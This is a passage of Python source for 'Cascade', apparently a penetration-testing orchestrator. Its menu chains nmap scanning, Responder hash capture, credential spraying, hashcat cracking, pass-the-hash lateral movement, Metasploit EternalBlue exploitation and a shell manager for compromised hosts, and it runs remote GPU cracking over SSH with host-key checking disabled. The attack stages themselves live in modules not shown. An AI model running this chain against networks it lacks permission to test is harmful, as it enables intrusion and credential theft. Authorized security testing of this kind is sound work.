              f"          {tui.DIM}nmap scan — find hosts, ports, services{tui.R}")
        print(f"  {tui.RED}{tui.B} 3{tui.R}  {tui.WH}Hash harvest{tui.R}"
              f"   {tui.DIM}Responder — capture NTLMv2 hashes passively{tui.R}")
        print(f"  {tui.RED}{tui.B} 4{tui.R}  {tui.WH}Cred spray{tui.R}"
              f"     {tui.DIM}SSH / SMB / HTTP default credential spray{tui.R}")
        print(f"  {tui.RED}{tui.B} 5{tui.R}  {tui.WH}Crack hashes{tui.R}"
              f"   {tui.DIM}hashcat NTLMv2 against wordlist{tui.R}")
        print(f"  {tui.RED}{tui.B} 6{tui.R}  {tui.WH}Lateral movement{tui.R}"
              f"  {tui.DIM}CrackMapExec + SSH, secretsdump, pass-the-hash{tui.R}")
        print(f"  {tui.RED}{tui.B} 7{tui.R}  {tui.WH}Exploit{tui.R}"
              f"         {tui.DIM}Metasploit auto-exploit (EternalBlue + more){tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 8{tui.R}  {tui.WH}Shell manager{tui.R}"
              f"  {tui.DIM}connect to compromised hosts — "
              f"{len(state.compromised)} available{tui.R}")
        print(f"  {tui.RED}{tui.B} 9{tui.R}  {tui.WH}Saved sessions{tui.R}"
              f" {tui.DIM}reconnect to previously compromised hosts{tui.R}")
        print()
        _vc = len(vault.cracked_entries())
        _vp = len(vault.pending_hashes())
        print(f"  {tui.RED}{tui.B} v{tui.R}  {tui.WH}Vault — hashes & cracked creds{tui.R}"
              f"  {tui.DIM}{_vc} cracked  {_vp} pending{tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} w{tui.R}  {tui.WH}Watch mode{tui.R}"
              f"     {tui.DIM}auto-harvest → crack → shell  (live dashboard){tui.R}")
        _win_cfg  = _pi_cfg_load()
        _win_host = _win_cfg.get("windows_host", "")
        _win_lbl  = (f"{tui.DIM}→ {_win_host}{tui.R}" if _win_host
                     else f"{tui.YLW}not configured — Setup → 11{tui.R}")
        print(f"  {tui.RED}{tui.B} g{tui.R}  {tui.WH}GPU crack (remote){tui.R}"
              f"  {tui.DIM}SSH → Windows, crack with GPU, sync back  {tui.R}{_win_lbl}")
        print()
        print(f"  {tui.DIM}   s  Setup    f  Free commands   "
              f"l  View log   u  Update   h  Help   q  Quit{tui.R}")
        tui.divider()
        print()

        try:
            raw = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip().lower()
        except KeyboardInterrupt:
            raw = "q"

        if raw == "q":
            print(f"\n  {tui.DIM}bye.{tui.R}\n")
            sys.exit(0)

        elif raw == "1":
            run_full_chain(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "2":
            tui.clear(); tui.print_banner(); _context_hint(state)
            run_stage1(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "3":
            tui.clear(); tui.print_banner(); _context_hint(state)
            run_stage2(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "4":
            tui.clear(); tui.print_banner(); _context_hint(state)
            run_stage3(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "5":
            tui.clear(); tui.print_banner(); _context_hint(state)
            run_stage4(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "6":
            tui.clear(); tui.print_banner(); _context_hint(state)
            run_stage5(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "7":
            tui.clear(); tui.print_banner(); _context_hint(state)
            run_stage6(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "8":
            if state.compromised:
                shells.access_menu(state.compromised)
            else:
                tui.clear(); tui.print_banner()
                tui.warn("No compromised hosts yet — run the kill chain first.")
                creds = state.all_creds()
                if creds:
                    targets = [
                        {"host": h, "cred": creds[0]}
                        for h in state.hosts
                        if any(p in (h.get("ports") or []) for p in [22, 445, 5985])
                    ]
                    if targets:
                        ans = input(f"  {tui.WH}Try shell with found credentials anyway? [Y/n] {tui.R}").strip().lower()
                        if ans != "n":
                            shells.access_menu(targets)
                            continue
                input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "9":
            shells.saved_menu()

        elif raw == "w":
            watch.run_watch(state.interface, state.subnet)

        elif raw == "g":
            _gpu_crack_via_ssh(state)

        elif raw == "v":
            vault_menu(state)

        elif raw == "s":
            setup_menu(state)

        elif raw == "f":
            tui.clear()
            print(f"  {tui.DIM}Dropping to bash. Type 'exit' to return to Cascade.{tui.R}\n")
            subprocess.call(["bash", "--login"])

        elif raw == "h":
            _print_about()

        elif raw == "l":
            tui.clear()
            print(f"\n  {tui.WH}{tui.B}CASCADE LOG{tui.R}  {tui.DIM}{logger.path()}{tui.R}\n")
            for line in logger.tail(60):
                lvl_col = (tui.RED   if "[ERROR" in line else
                           tui.YLW   if "[WARN"  in line else
                           tui.GRN   if "[SUCCESS" in line else
                           tui.DIM)
                print(f"  {lvl_col}{line}{tui.R}")
            print()
            input(f"  {tui.DIM}[ press Enter ]{tui.R}")

        elif raw == "u":
            _self_update()
            input(f"\n  {tui.DIM}[ press Enter — restart cascade to use the new version ]{tui.R}")


def _gpu_crack_via_ssh(state: State):
    """
    SSH from the Pi into the Windows GPU machine and trigger cascade --pull-and-crack.
    Windows pulls vault from Pi, cracks with GPU + rules, pushes cracked vault back.
    """
    tui.clear()
    tui.print_banner()
    tui.phase("GPU CRACK — REMOTE WINDOWS")

    cfg = _pi_cfg_load()
    win_host = cfg.get("windows_host", "")
    win_user = cfg.get("windows_user", "")
    win_port = cfg.get("windows_ssh_port", 22)

    if not win_host or not win_user:
        tui.warn("Windows GPU machine not configured. Go to Setup → Configure GPU machine.")
        input(f"\n  {tui.DIM}[ press Enter to go back ]{tui.R}")
        return

    # Get our own Tailscale IP so Windows can SCP vault back to us
    try:
        pi_ip = subprocess.check_output(
            ["tailscale", "ip", "--4"], text=True,
            stderr=subprocess.DEVNULL, timeout=5
        ).strip()
    except Exception:
        pi_ip = subprocess.check_output(
            ["hostname", "-I"], text=True
        ).strip().split()[0]

    cascade_exe = cfg.get("windows_cascade_exe", "cascade")

    tui.info(f"Connecting to {win_user}@{win_host}:{win_port} ...")
    tui.info(f"Pi Tailscale: {pi_ip}")
    print()

    # Build SSH command
    key_opt = []
    key = cfg.get("windows_ssh_key", "")
    if key and Path(key).exists():
        key_opt = ["-i", key]

    ssh_cmd = [
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=15",
        "-o", "BatchMode=yes",
        "-p", str(win_port),
    ] + key_opt + [
        f"{win_user}@{win_host}",
        f"{cascade_exe} --pull-and-crack --pi-host {pi_ip}"
    ]

    tui.info(f"Running: {' '.join(ssh_cmd)}")
    print()

    try:
        result = subprocess.run(ssh_cmd, timeout=900)
        if result.returncode == 0:
            tui.success("GPU crack complete! Vault should be updated.")
            # Reload vault display
            vc = len(vault.cracked_entries())
            vp = len(vault.pending_hashes())
            tui.info(f"Vault: {tui.GRN}{vc} cracked{tui.R}  {tui.YLW}{vp} still pending{tui.R}")
        else:
            tui.error(f"SSH command returned {result.returncode}.")
            tui.info("Check: Windows SSH running? Pi key authorized? cascade installed on Windows?")
    except subprocess.TimeoutExpired:
        tui.error("Timed out waiting for GPU crack (15 min limit).")
    except FileNotFoundError:
        tui.error("ssh not found — install openssh-client: sudo apt install openssh-client")

    input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")


def _setup_gpu_machine():
    """
    Interactive setup: configure the Windows GPU machine for SSH-triggered cracking.
    Generates Pi SSH key if needed, tests connection, saves config.
    """
    tui.clear()
    tui.print_banner()
    tui.phase("SETUP — WINDOWS GPU MACHINE")

    cfg = _pi_cfg_load()

    print(f"  {tui.DIM}Configure your Windows machine so the Pi can trigger GPU cracking via SSH.{tui.R}")
    print(f"  {tui.DIM}On Windows: run cascade, then press x to set up the SSH server (runs as admin).{tui.R}")
    print()

    # ── Step 1: Windows host ──────────────────────────────────────────────────
    cur_host = cfg.get("windows_host", "")
    v = input(f"  {tui.WH}Windows Tailscale IP [{cur_host or 'e.g. 100.x.x.x'}]: {tui.R}").strip()
    if v: cfg["windows_host"] = v
    if not cfg.get("windows_host"):
        tui.warn("No host set. Aborting.")
        return

    cur_user = cfg.get("windows_user", "")
    v = input(f"  {tui.WH}Windows username [{cur_user or 'e.g. Alec'}]: {tui.R}").strip()
    if v: cfg["windows_user"] = v

    v = input(f"  {tui.WH}SSH port [{cfg.get('windows_ssh_port', 22)}]: {tui.R}").strip()
    if v:
        try: cfg["windows_ssh_port"] = int(v)
        except ValueError: pass

    cascade_exe = cfg.get("windows_cascade_exe", "cascade")
    v = input(f"  {tui.WH}cascade.exe path on Windows [{cascade_exe}]: {tui.R}").strip()
    if v: cfg["windows_cascade_exe"] = v

    # ── Step 2: Generate / show Pi SSH key ────────────────────────────────────
    key_file = Path("/root/.ssh/cascade_win_ed25519")
    if not key_file.exists():
        tui.info("Generating SSH key for Pi → Windows auth ...")
        subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", str(key_file),
                        "-N", "", "-q", "-C", "cascade-pi"],
                       check=True)
        tui.success(f"Key created: {key_file}")

    cfg["windows_ssh_key"] = str(key_file)
    pub_key = (key_file.parent / (key_file.name + ".pub")).read_text().strip()

    print()
    print(f"  {tui.WH}{tui.B}Add this public key to your Windows machine:{tui.R}")
    print(f"  {tui.DIM}File: C:\\ProgramData\\ssh\\administrators_authorized_keys{tui.R}")
    print(f"  {tui.DIM}On Windows cascade → x (Setup SSH server) → paste this key when prompted{tui.R}")
    print()
    print(f"  {tui.YLW}{pub_key}{tui.R}")
    print()
    input(f"  {tui.DIM}[ Add the key on Windows, then press Enter to test the connection ]{tui.R}")

    # ── Step 3: Test connection ───────────────────────────────────────────────
    tui.info("Testing SSH connection ...")
    ssh_test = [
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=10",
        "-o", "BatchMode=yes",
        "-i", str(key_file),
        "-p", str(cfg.get("windows_ssh_port", 22)),
        f"{cfg['windows_user']}@{cfg['windows_host']}",
        "echo cascade-ok"
    ]
    r = subprocess.run(ssh_test, capture_output=True, text=True, timeout=15)
    if "cascade-ok" in r.stdout:
        tui.success("Connection works!")
        cfg["_ssh_tested"] = True
    else:
        tui.error("Connection failed.")
        tui.info(f"  stderr: {r.stderr.strip()[:200]}")
        tui.info("  Check: SSH server running on Windows? Key added to authorized_keys?")
        tui.info("  Saving config anyway — fix the issue and retry from Setup.")

    _pi_cfg_save(cfg)
    tui.success("Config saved.")
    input(f"\n  {tui.DIM}[ press Enter to go back ]{tui.R}")


def _self_update():
    # Prefer the known Pi deploy path; fall back to package source location
    _known = Path("/home/kali/cascade")
    repo = _known if (_known / ".git").exists() else Path(__file__).resolve().parent.parent
    print(f"\n  {tui.DIM}Repo: {repo}{tui.R}")
    print(f"  {tui.WH}Pulling latest from GitHub...{tui.R}")
    r = subprocess.run(["git", "pull"], cwd=str(repo), capture_output=True, text=True)
    if r.returncode != 0:
        print(f"  {tui.RED}git pull failed:{tui.R}\n  {r.stderr.strip()}")
        return
    print(f"  {tui.GRN}{r.stdout.strip() or 'Already up to date.'}{tui.R}")
    print(f"  {tui.WH}Reinstalling package...{tui.R}")
    r2 = subprocess.run(
        [sys.executable, "-m", "pip", "install", "-e", str(repo),
         "--break-system-packages", "-q"],
        capture_output=True, text=True
    )
    if r2.returncode != 0:
        print(f"  {tui.RED}pip install failed:{tui.R}\n  {r2.stderr.strip()}")
        return
    print(f"  {tui.GRN}Updated. Restart cascade to use the new version.{tui.R}")


# ── entry point ───────────────────────────────────────────────────────────────

def main():
    if os.geteuid() != 0:
        print("[!] Run as root: sudo cascade")
        sys.exit(1)

    import argparse
    ap = argparse.ArgumentParser(
        description="Cascade — Post-exploitation orchestrator",
        epilog="Only run against networks you own or have permission to test.",
    )
    ap.add_argument("--version", action="version",
                    version=f"cascade {__import__('cascade').__version__}")
    ap.parse_args()

    state = State()

    # Wizard always runs first — picks adapter and auto-fixes modes before menu opens
    adapter_wizard(state)

    main_menu(state)


if __name__ == "__main__":
    main()
